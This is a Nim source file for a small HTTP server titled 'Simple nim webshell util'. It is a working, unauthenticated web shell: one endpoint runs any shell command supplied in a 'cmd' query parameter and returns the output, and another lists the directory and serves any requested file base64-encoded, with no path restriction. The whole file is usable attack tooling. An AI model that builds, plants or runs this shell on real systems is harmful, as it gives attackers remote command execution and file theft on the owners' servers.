#Imports
import asynchttpserver
import asyncdispatch
import os
import strutils
import base64
import osproc
import uri

#Variables 
var server = newAsyncHttpServer()
var httpPort = 8080


#Procedures

proc GatherFiles(): string =
# Collect the files in the current directory into an array
# Excludes directories if they exist
    var files: string = ""
    var fileLink: string = ""
    #[
        This for loop will use walkFiles to list out the current files in the directory
        Then it will create a new variable calld "fileLink" and save a string that will end up being a link on our page to the file. It will end up looking like
        <a href='/download?file=secrect.txt'>secrect.txt</a><br />
    ]#
    for file in walkFiles("*"):
        fileLink = "<a href='/download?file=" & file & "'>" & file & "</a><br />" #This line prints out each file and gives a link to it
        files.add fileLink #adds it to the array that will be displayed 
    result = files

proc httpResponse(req: Request) {.async.} =
    var htmlContent: string = ""    ## Empty
    var headers = {"Content-type": "text/html; charset=utf-8"}
    if req.url.path == "/":
        var htmlInitial: string = "<html><body><h1>Simple nim webshell util</h1>"
        var htmlEnd: string = "</body></html>"
        htmlContent.add (htmlInitial & htmlEnd)
        htmlContent.add ("<a href=/command>http://127.0.0.1/command</a><br /><br />")
        htmlContent.add ("<a href=/pwd>http://127.0.0.1/pwd</a><br /><br />")

    elif req.url.path == "/pwd":
        var htmlInitial: string = "<html><body><h1>Select File to Download</h1>"
        var htmlEnd: string = "</body></html>"
        htmlContent.add (htmlInitial & GatherFiles() & htmlEnd)
        
    # Build the file download function
    elif req.url.path == "/download":
        #htmlContent.add (req.url.query)
        headers = {"Content-type": "text/plain; charset=utf-8"}
        let queryTXT = req.url.query.split('=')
        let fileContent = readFile(queryTXT[1])
        # base64 encode the files and then display them...
        htmlContent.add encode(fileContent)

    elif req.url.path == "/command":
        if "cmd" in req.url.query:
            var queryTXT = req.url.query.split('=')
            var cmd = decodeUrl(queryTXT[1])
            var cmdResults = execProcess(cmd)
            htmlContent.add ("<a href=/command>http://127.0.0.1/command</a><br /><br />")
            htmlContent.add ("Command Executed: " & cmd & "<br /><br />")
            htmlContent.add "Results<br />"
            htmlContent.add ("<pre>" & $cmdResults & "</pre>")

        else:
            htmlContent.add "<h3>Select Linux Commands to Execute</h3>"
            htmlContent.add "<a href=/command?cmd=ls>http://127.0.0.1/command?cmd=ls</a><br />"
            htmlContent.add "<a href=/command?cmd=whoami>http://127.0.0.1/command?cmd=whoami</a><br />"

    else:
        htmlContent.add "What are you trying to do?"
    await req.respond(Http200, htmlContent, headers.newHttpHeaders())

waitFor server.serve(Port(httpPort), httpResponse)